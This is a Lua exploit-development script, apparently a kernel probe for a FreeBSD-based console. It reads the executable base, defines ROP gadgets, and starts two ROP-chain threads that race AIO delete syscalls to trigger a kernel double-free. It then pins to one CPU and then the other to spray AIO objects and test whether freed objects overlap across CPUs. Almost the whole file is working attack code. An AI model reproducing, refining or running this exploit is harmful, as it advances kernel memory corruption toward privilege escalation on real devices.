-- CRASH_CLASS: HIGH
-- PROBE 67h: Cross-CPU overlap via sequential delete
--
-- Pattern from 65l (proven). After double-free, spray from CPU 0
-- then CPU 1 (pinned). Delete CPU 0's first, then CPU 1's.
-- If objects overlap across CPUs, CPU 1's deletes see stale data.

print("=== PROBE 67h: CROSS-CPU DELETE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xCD
end

-- CPU pinning via cpuset_setaffinity(488)
local pin_buf = memory.alloc(8)
local function set_cpu(mask)
    wq(N(pin_buf), uint64(mask))
    pcall(function()
        mk(488)(uint64(3), uint64(2), uint64(pid_val), uint64(8), uint64(N(pin_buf)))
    end)
end

-- =============================================
-- [A] DOUBLE-FREE using 65l pattern (2 children)
-- =============================================
print("")
print("-- [A] DOUBLE-FREE (mask=0x03) --")
set_cpu(3)

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local total_doubles = 0
local RACE_ITERS = 10

for race_iter = 1, RACE_ITERS do
    if not alive() then print("DEAD during race"); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < BATCH then
        print("  iter " .. race_iter .. ": only got " .. #ids)
        break
    end

    local count = #ids
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    for w = 1, 50000 do local _ = rd(sb_A) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles
    if doubles > 0 then
        print(string.format("  iter %d: %d doubles (total=%d)", race_iter, doubles, total_doubles))
    end

    if total_doubles >= 4 then break end
end

print("total_doubles=" .. total_doubles)
if total_doubles < 2 then
    print("INSUFFICIENT")
    print("=== DONE ===")
    return
end

if not alive() then print("DEAD after race"); return end

-- =============================================
-- [B] SPRAY from CPU 0, then CPU 1
-- =============================================
print("")
print("-- [B] SPRAY: CPU0 (64) then CPU1 (64) --")

set_cpu(1)  -- pin to CPU 0 only
local cpu0_ids = {}
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then cpu0_ids[#cpu0_ids + 1] = id end
end

set_cpu(2)  -- pin to CPU 1 only
local cpu1_ids = {}
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then cpu1_ids[#cpu1_ids + 1] = id end
end

print(string.format("  cpu0=%d cpu1=%d", #cpu0_ids, #cpu1_ids))

-- Poll all (from either CPU)
set_cpu(3)
for _, id in ipairs(cpu0_ids) do poll_one(id) end
for _, id in ipairs(cpu1_ids) do poll_one(id) end

if not alive() then print("DEAD after spray"); return end

-- =============================================
-- [C] DELETE CPU0 first (from CPU 0), then CPU1 (from CPU 1)
-- =============================================
print("")
print("-- [C] DELETE CPU0 FIRST --")
set_cpu(1)
local del0_ok, del0_fail = 0, 0
for _, id in ipairs(cpu0_ids) do
    local st = delete_one(id)
    if st == 0 then del0_ok = del0_ok + 1 else del0_fail = del0_fail + 1 end
end
print(string.format("  cpu0_del: ok=%d fail=%d", del0_ok, del0_fail))

if not alive() then print("DEAD after cpu0 del"); return end

print("")
print("-- [D] DELETE CPU1 (observe anomalies) --")
set_cpu(2)
local del1_ok, del1_fail = 0, 0
local anomalous = {}
for i, id in ipairs(cpu1_ids) do
    if not alive() then
        print("  DIED at index " .. i)
        break
    end
    local st = delete_one(id)
    if st == 0 then
        del1_ok = del1_ok + 1
    else
        del1_fail = del1_fail + 1
        if #anomalous < 10 then
            anomalous[#anomalous + 1] = string.format("id=0x%X st=0x%08X", id, st)
        end
    end
end
print(string.format("  cpu1_del: ok=%d fail=%d", del1_ok, del1_fail))
for _, s in ipairs(anomalous) do print("  * " .. s) end

-- =============================================
-- [E] AIO READ ON SOCKETPAIR (timing control test)
-- =============================================
if alive() then
    print("")
    print("-- [E] SOCKETPAIR AIO READ --")
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp)))
    end)
    local sp_ret = ok_sp and sgn(rv_sp) or -999
    local sp_fd0 = rd(N(sp)) or -1
    local sp_fd1 = rd(N(sp) + 4) or -1
    print(string.format("  socketpair: ret=%d fd0=%d fd1=%d", sp_ret, sp_fd0, sp_fd1))

    if sp_ret == 0 and sp_fd0 > 0 and sp_fd1 > 0 then
        -- Submit AIO read on socketpair fd0 (no data yet)
        local aio_res = memory.alloc(8); wd(N(aio_res), 0xDEAD)
        local aio_data = memory.alloc(64)
        for i = 0, 60, 4 do wd(N(aio_data) + i, 0xCCCC) end

        wq(N(reqs), uint64(0))  -- cmd=0 (try)
        wq(N(reqs) + 8, uint64(16))
        local bh, bl = get_hi_lo(uint64(N(aio_data)))
        wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
        local rh, rl = get_hi_lo(uint64(N(aio_res)))
        wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
        wd(N(reqs) + 0x20, sp_fd0); wd(N(reqs) + 0x24, 0)
        wd(N(one_id), 0)
        local ok_aio, rv_aio = pcall(function()
            return mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
        end)
        local aio_ret = ok_aio and sgn(rv_aio) or -999
        local aio_id = rd(N(one_id)) or 0
        local res_val = rd(N(aio_res)) or 0xDEAD
        print(string.format("  aio_read(sp): ret=%d id=0x%X result=0x%X",
            aio_ret, aio_id, res_val))

        if aio_id > 0 then
            -- Write data to fd1 → should complete the read
            local wbuf = memory.alloc(16)
            for i = 0, 12, 4 do wd(N(wbuf) + i, 0x41424344) end
            local ok_w, rv_w = pcall(function()
                return mk(4)(uint64(sp_fd1), uint64(N(wbuf)), uint64(16))
            end)
            local w_ret = ok_w and sgn(rv_w) or -999
            print(string.format("  write(fd1): ret=%d", w_ret))

            for w = 1, 50000 do end

            local res_after = rd(N(aio_res)) or 0xDEAD
            local read_d0 = rd(N(aio_data)) or 0xCCCC
            print(string.format("  result_after=0x%X data=0x%X", res_after, read_d0))

            poll_one(aio_id)
            delete_one(aio_id)
        end

        pcall(function() mk(6)(uint64(sp_fd0)) end)
        pcall(function() mk(6)(uint64(sp_fd1)) end)
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67h DONE ===")
